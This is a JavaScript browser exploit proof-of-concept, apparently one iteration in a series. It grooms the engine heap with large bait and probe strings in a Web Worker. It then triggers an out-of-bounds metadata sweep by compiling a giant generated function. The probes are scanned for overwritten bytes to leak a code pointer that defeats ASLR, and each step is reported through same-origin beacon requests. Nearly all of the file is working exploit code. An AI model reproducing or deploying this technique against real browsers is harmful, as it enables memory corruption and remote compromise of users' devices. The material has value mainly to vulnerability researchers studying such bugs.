// p383 - Same-bin string OOB read via MetadataTable sweep
//
// V382: oob0-shrink0-ok120. No string corruption because no bait-and-switch:
// MetaTable at high address, all probe strings below it.
//
// FIX: Bait-and-switch with 100KB strings. Probes are ALSO 100KB strings
// (same marge size class as MetaTable = 100,112 bytes). After freeing baits,
// MetaTable fills a low-address bait hole. Probes at higher addresses get
// swept. The sweep writes thunk bytes directly into probe character data.
//
// Detection: scan probe character data for non-fill-character bytes.
// The sweep writes at offsets 12, 24, 64, 68 within each 112-byte stride.
// Thunk pointer (8 bytes) at entry+24 is the ASLR leak.
//
// Beacon prefix: V383-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V383-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {
      try { new Image().src = '/beacon/V383-' + tag + '?t=' + Date.now(); } catch(e2) {}
    }
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  var workerCode = function() {
    var probes = [];
    var baseUrl = '';

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V383-W-' + tag + '?t=' + Date.now(), false);
        x.send('');
      } catch(e) {}
    }
    function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }

      if (e.data.cmd === 'alloc') {
        // Phase 1: Allocate 20 bait strings (100KB, fill with 'B')
        // These go into the ~100KB marge size class
        var baits = [];
        for (var i = 0; i < 20; i++) {
          var b = '';
          for (var j = 0; j < 100; j++) b += 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
          b = b.substring(0, 100000);
          b.charCodeAt(0); // flatten
          baits.push(b);
        }
        beacon('BAIT-' + baits.length);

        // Phase 2: Allocate 10 probe strings (100KB, fill with 'P' = 0x50)
        for (var i = 0; i < 10; i++) {
          var p = '';
          for (var j = 0; j < 100; j++) p += 'PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP';
          p = p.substring(0, 100000);
          p.charCodeAt(0); // flatten
          probes.push(p);
        }
        beacon('PROBES-' + probes.length);

        // Phase 3: Free baits
        for (var i = 0; i < baits.length; i++) baits[i] = null;
        baits = null;
        beacon('FREED');

        self.postMessage({ ready: true });
        return;
      }

      if (e.data.cmd === 'scan') {
        beacon('SCANNING');
        var hitCount = 0;

        for (var i = 0; i < probes.length; i++) {
          try {
            var p = probes[i];
            var len = p.length;

            // Check m_length corruption
            if (len !== 100000) {
              beacon('P' + i + '-LEN-' + len);
            }

            // Scan first 1000 chars for non-'P' bytes
            // The sweep pattern repeats every 112 bytes.
            // At stride offsets: +12(4B 0xFF), +24(8B thunk), +64(4B), +68(4B)
            var useLen = Math.min(len, 100000);
            var firstHit = -1;
            var nonP = 0;

            // Quick scan: count non-'P' in first 1000 chars
            for (var j = 0; j < Math.min(useLen, 1000); j++) {
              if (p.charCodeAt(j) !== 0x50) {
                nonP++;
                if (firstHit < 0) firstHit = j;
              }
            }

            if (nonP > 0) {
              hitCount++;
              beacon('P' + i + '-HIT-first' + firstHit + '-count' + nonP);

              // Dump 112 bytes around firstHit (one full entry stride)
              var dumpStart = Math.max(0, firstHit - 16);
              var dumpEnd = Math.min(useLen, dumpStart + 128);
              var hex = '';
              for (var j = dumpStart; j < dumpEnd; j++) {
                hex += hexByte(p.charCodeAt(j));
              }
              // Send in chunks
              for (var off = 0; off < hex.length; off += 60) {
                beacon('P' + i + '-D' + Math.floor((dumpStart + off/2)) + '-' + hex.substring(off, off + 60));
              }

              // Look for 0xFF 0xFF 0xFF 0xFF signature in first 2000 chars
              for (var j = 0; j < Math.min(useLen, 2000) - 4; j++) {
                if (p.charCodeAt(j) === 0xFF && p.charCodeAt(j+1) === 0xFF &&
                    p.charCodeAt(j+2) === 0xFF && p.charCodeAt(j+3) === 0xFF) {
                  beacon('P' + i + '-SIG-' + j);

                  // Thunk at sig+12
                  var thunk = '';
                  for (var k = j + 12; k < j + 20 && k < useLen; k++) {
                    thunk += hexByte(p.charCodeAt(k));
                  }
                  beacon('P' + i + '-THUNK-' + thunk);

                  // bytecodeIndex at sig+56
                  if (j + 59 < useLen) {
                    var bci = p.charCodeAt(j+56) | (p.charCodeAt(j+57) << 8) |
                              (p.charCodeAt(j+58) << 16) | (p.charCodeAt(j+59) << 24);
                    beacon('P' + i + '-BCI-' + bci);
                  }

                  // Verify next sig at +112
                  if (j + 112 + 4 <= useLen) {
                    var next = (p.charCodeAt(j+112) === 0xFF && p.charCodeAt(j+113) === 0xFF &&
                                p.charCodeAt(j+114) === 0xFF && p.charCodeAt(j+115) === 0xFF);
                    beacon('P' + i + '-NEXT-' + (next ? 'MATCH' : 'MISS'));
                    if (next) {
                      var t2 = '';
                      for (var k = j + 112 + 12; k < j + 112 + 20; k++) t2 += hexByte(p.charCodeAt(k));
                      beacon('P' + i + '-T2-' + t2);
                    }
                  }
                  break;
                }
              }

              // Full non-P scan (first 5000 chars)
              var totalNonP = 0;
              for (var j = 0; j < Math.min(useLen, 5000); j++) {
                if (p.charCodeAt(j) !== 0x50) totalNonP++;
              }
              beacon('P' + i + '-TOTAL-nonP' + totalNonP + '-in5000');

            } else {
              beacon('P' + i + '-CLEAN');
            }
          } catch(ex) {
            beacon('P' + i + '-CRASH-' + (ex.message || '').substring(0, 30));
          }
        }

        beacon('HITS-' + hitCount);
        beacon('DONE');
        self.postMessage({ done: true });
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  var baseUrl = location.protocol + '//' + location.host;
  worker.postMessage({ cmd: 'init', baseUrl: baseUrl });

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');

      // GC pressure to reclaim freed baits
      var gcR = 0;
      function gc() {
        for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
        for (var j = 0; j < 500; j++) new Array(100).fill(gcR);
        gcR++;
        if (gcR < 30) setTimeout(gc, 30);
        else { B('GC-' + gcR); build(); }
      }
      gc();
    }
    if (e.data.done) B('ALL-DONE');
  };

  worker.postMessage({ cmd: 'alloc' });

  function build() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var cc = 'a();'.repeat(CHUNK);
    var p = ['window.__p383fn=function(a){'];
    for (var c = 0; c < nC; c++) p.push(cc);
    p.push('a();'.repeat(rem));
    p.push('};window.__p383ok=true;');
    cc = null;
    var blob = new Blob(p, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    p = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__p383ok ? 'OK' : 'FAIL'));
      worker.postMessage({ cmd: 'scan' });
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
